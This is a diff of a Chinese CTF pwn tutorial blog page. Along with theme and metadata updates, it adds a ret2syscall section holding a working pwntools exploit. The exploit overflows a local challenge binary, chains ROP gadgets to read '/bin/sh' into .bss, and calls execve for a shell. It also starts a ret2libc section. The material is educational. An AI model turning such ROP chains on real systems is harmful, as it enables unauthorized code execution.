@@ -14,10 +14,11 @@
 
 
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"hacbit.tech","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"hacbit.tech","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="概述pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。（拜托~，pwn掉系统什么的真的超帅的！）">
@@ -33,8 +34,9 @@
 <meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630181458474.png">
 <meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630181512640.png">
 <meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630182535293.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230710224440879.png">
 <meta property="article:published_time" content="2023-06-20T17:28:27.000Z">
-<meta property="article:modified_time" content="2023-07-06T01:13:05.076Z">
+<meta property="article:modified_time" content="2023-07-11T14:11:58.622Z">
 <meta property="article:author" content="hacbit">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png">
@@ -138,11 +140,6 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
 
   </li>
-        <li class="menu-item menu-item-resources">
-
-    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>resources</a>
-
-  </li>
         <li class="menu-item menu-item-categories">
 
     <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
@@ -238,7 +235,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-07-06 09:13:05" itemprop="dateModified" datetime="2023-07-06T09:13:05+08:00">2023-07-06</time>
+                <time title="Modified: 2023-07-11 22:11:58" itemprop="dateModified" datetime="2023-07-11T22:11:58+08:00">2023-07-11</time>
               </span>
 
           
@@ -254,14 +251,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>4.5k</span>
+              <span>4.7k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>8 mins.</span>
+              <span>9 mins.</span>
             </span>
 
         </div>
@@ -409,12 +406,25 @@
 
 <h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>简单来说就是执行系统调用来实现想要实现的功能，比如可以用 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> 系统调用来获取shell，这需要满足：</p>
 <ul>
-<li>系统调用号，eax 为 0xb(x86) &#x2F; rax 为 0x1b(x64)</li>
-<li>第一个参数，为 &#x2F;bin&#x2F;sh 地址</li>
-<li>第二个参数，ecx 为 0</li>
-<li>第三个参数，edx 为 0</li>
-<li>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</li>
+<li><p>系统调用号，eax 为 0xb(x86) &#x2F; rax 为 0x3b(x64)</p>
+</li>
+<li><p>第一个参数，ebx &#x2F; rdi 为 &#x2F;bin&#x2F;sh 地址</p>
+</li>
+<li><p>第二个参数，ecx 为 0 &#x2F; rsi 为 0</p>
+</li>
+<li><p>第三个参数，edx 为 0 &#x2F; rdx 为 0</p>
+</li>
+<li><p>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</p>
+<p>看一道例题：<a href="../resources/pwn_asset/ret2sys_64" target="_blank">ret2sys_64</a></p>
+</li>
 </ul>
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230710224440879.png" alt="image-20230710224440879"></p>
+<p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本</p>
+<p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网）</p>
 <p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p>
 <h2 id="ELF文件保护机制及基本绕过手法"><a href="#ELF文件保护机制及基本绕过手法" class="headerlink" title="ELF文件保护机制及基本绕过手法"></a>ELF文件保护机制及基本绕过手法</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3>
     </div>
@@ -524,7 +534,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9F%E8%AE%B8%E9%9C%80%E8%A6%81nc%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%81"><span class="nav-number">2.</span> <span class="nav-text">也许需要nc一下？！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%9F%EF%BC%81%E6%BA%A2%E5%87%BA%E4%B8%80%E4%B8%8B%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">这是什么？缓冲区？！溢出一下！</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E3%81%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">3.1.</span> <span class="nav-text">栈の基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%EF%BC%9F%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">什么是栈？（stack）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E5%B8%A7%EF%BC%9F%EF%BC%88stack-frame%EF%BC%89"><span class="nav-number">3.1.2.</span> <span class="nav-text">什么是栈帧？（stack frame）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bss%EF%BC%8Cdata%EF%BC%8Ctext%EF%BC%8Cheap-amp-stack"><span class="nav-number">3.2.</span> <span class="nav-text">bss，data，text，heap &amp; stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bss-segment%EF%BC%9A"><span class="nav-number">3.2.1.</span> <span class="nav-text">bss segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-segment%EF%BC%9A"><span class="nav-number">3.2.2.</span> <span class="nav-text">data segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-x2F-text-segment%EF%BC%9A"><span class="nav-number">3.2.3.</span> <span class="nav-text">code&#x2F;text segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%EF%BC%88heap%EF%BC%89%EF%BC%9A"><span class="nav-number">3.2.4.</span> <span class="nav-text">堆（heap）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.2.5.</span> <span class="nav-text">栈（stack）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E5%9F%BA%E7%A1%80"><span class="nav-number">3.3.</span> <span class="nav-text">pwntools基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85pwntools"><span class="nav-number">3.3.1.</span> <span class="nav-text">安装pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.2.</span> <span class="nav-text">pwntools使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">基本框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#send-or-receive"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">send or receive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%89%93%E5%8C%85"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">数据打包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="nav-number">3.3.2.4.</span> <span class="nav-text">输出数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cyclic-pattern"><span class="nav-number">3.3.2.5.</span> <span class="nav-text">Cyclic pattern</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.2.6.</span> <span class="nav-text">ELF文件操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyROP"><span class="nav-number">3.4.</span> <span class="nav-text">babyROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="nav-number">3.4.1.</span> <span class="nav-text">什么是ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81ROP"><span class="nav-number">3.4.2.</span> <span class="nav-text">为什么要ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="nav-number">3.4.3.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2text"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.4.3.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.4.3.3.</span> <span class="nav-text">ret2syscall</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%9F%BA%E6%9C%AC%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-number">3.5.</span> <span class="nav-text">ELF文件保护机制及基本绕过手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#canary"><span class="nav-number">3.5.1.</span> <span class="nav-text">canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE"><span class="nav-number">3.5.2.</span> <span class="nav-text">PIE</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9F%E8%AE%B8%E9%9C%80%E8%A6%81nc%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%81"><span class="nav-number">2.</span> <span class="nav-text">也许需要nc一下？！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%9F%EF%BC%81%E6%BA%A2%E5%87%BA%E4%B8%80%E4%B8%8B%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">这是什么？缓冲区？！溢出一下！</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E3%81%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">3.1.</span> <span class="nav-text">栈の基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%EF%BC%9F%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">什么是栈？（stack）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E5%B8%A7%EF%BC%9F%EF%BC%88stack-frame%EF%BC%89"><span class="nav-number">3.1.2.</span> <span class="nav-text">什么是栈帧？（stack frame）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bss%EF%BC%8Cdata%EF%BC%8Ctext%EF%BC%8Cheap-amp-stack"><span class="nav-number">3.2.</span> <span class="nav-text">bss，data，text，heap &amp; stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bss-segment%EF%BC%9A"><span class="nav-number">3.2.1.</span> <span class="nav-text">bss segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-segment%EF%BC%9A"><span class="nav-number">3.2.2.</span> <span class="nav-text">data segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-x2F-text-segment%EF%BC%9A"><span class="nav-number">3.2.3.</span> <span class="nav-text">code&#x2F;text segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%EF%BC%88heap%EF%BC%89%EF%BC%9A"><span class="nav-number">3.2.4.</span> <span class="nav-text">堆（heap）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.2.5.</span> <span class="nav-text">栈（stack）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E5%9F%BA%E7%A1%80"><span class="nav-number">3.3.</span> <span class="nav-text">pwntools基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85pwntools"><span class="nav-number">3.3.1.</span> <span class="nav-text">安装pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.2.</span> <span class="nav-text">pwntools使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">基本框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#send-or-receive"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">send or receive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%89%93%E5%8C%85"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">数据打包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="nav-number">3.3.2.4.</span> <span class="nav-text">输出数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cyclic-pattern"><span class="nav-number">3.3.2.5.</span> <span class="nav-text">Cyclic pattern</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.2.6.</span> <span class="nav-text">ELF文件操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyROP"><span class="nav-number">3.4.</span> <span class="nav-text">babyROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="nav-number">3.4.1.</span> <span class="nav-text">什么是ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81ROP"><span class="nav-number">3.4.2.</span> <span class="nav-text">为什么要ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="nav-number">3.4.3.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2text"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.4.3.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.4.3.3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.4.3.4.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%9F%BA%E6%9C%AC%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-number">3.5.</span> <span class="nav-text">ELF文件保护机制及基本绕过手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#canary"><span class="nav-number">3.5.1.</span> <span class="nav-text">canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE"><span class="nav-number">3.5.2.</span> <span class="nav-text">PIE</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -875,13 +885,13 @@ if(canvas.getContext){
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">4k</span>
+    <span title="Symbols count total">5k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">8 mins.</span>
+    <span title="Reading time total">9 mins.</span>
 </div>
   <div class="powered-by">
     <!--Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> -->
@@ -889,7 +899,7 @@ if(canvas.getContext){
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">The blog has a total of 4.1k words</span>
+  <span class="post-count">The blog has a total of 4.3k words</span>
 </div>
 
 
@@ -957,6 +967,8 @@ if(canvas.getContext){
   
   <script color='123,174,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
 
